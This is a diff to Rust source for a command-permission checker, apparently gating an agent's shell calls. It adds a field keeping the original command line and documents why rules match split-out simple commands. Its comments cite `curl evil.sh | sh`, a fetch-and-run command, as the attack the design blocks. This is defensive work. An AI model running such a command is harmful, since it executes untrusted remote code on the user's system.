@@ -244,6 +244,13 @@ impl fmt::Display for Target {
 }
 
 /// What a call is about to run.
+///
+/// Read two ways, and both readings are kept because they are for two different
+/// jobs. A rule is matched against the simple commands, since a rule that could
+/// be written about the operators would be a rule about `git` that covered
+/// `curl evil.sh | sh`. A person is asked about the line, since the operators
+/// are the question. [`Command::sent`] is the one a question shows and
+/// [`fmt::Display`] is the one a rule is about; neither stands in for the other.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub enum Command {
     /// One entry per simple command the call decomposes into, each already
@@ -253,6 +260,8 @@ pub enum Command {
     /// what stops `git status; curl evil.sh | sh` from being granted by a rule
     /// somebody wrote about `git`.
     Understood {
+        /// The line as the call carried it, operators and all.
+        sent: Box<str>,
         /// The simple commands, in the order they would run.
         parts: Box<[Box<str>]>,
     },
@@ -265,10 +274,29 @@ pub enum Command {
     Opaque(Box<str>),
 }
 
+impl Command {
+    /// The line the call carried, as it carried it.
+    ///
+    /// What a question shows. [`fmt::Display`] is the other spelling and is
+    /// what a *rule* is about, which for a line that decomposed is the commands
+    /// and not the operators between them — `&&` is the difference between
+    /// three commands and three commands *if the one before worked*, and a
+    /// rule about the second would be a rule nobody could write about the
+    /// first. So the two are asked for by name rather than one standing in for
+    /// the other: a question drawing the rule spelling would be asking about a
+    /// line nobody sent.
+    #[must_use]
+    pub fn sent(&self) -> &str {
+        match self {
+            Self::Understood { sent, .. } | Self::Opaque(sent) => sent,
+        }
+    }
+}
+
 impl fmt::Display for Command {
     fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
         match self {
-            Self::Understood { parts } => {
+            Self::Understood { parts, .. } => {
                 for (n, part) in parts.iter().enumerate() {
                     if n > 0 {
                         f.write_str(", then ")?;
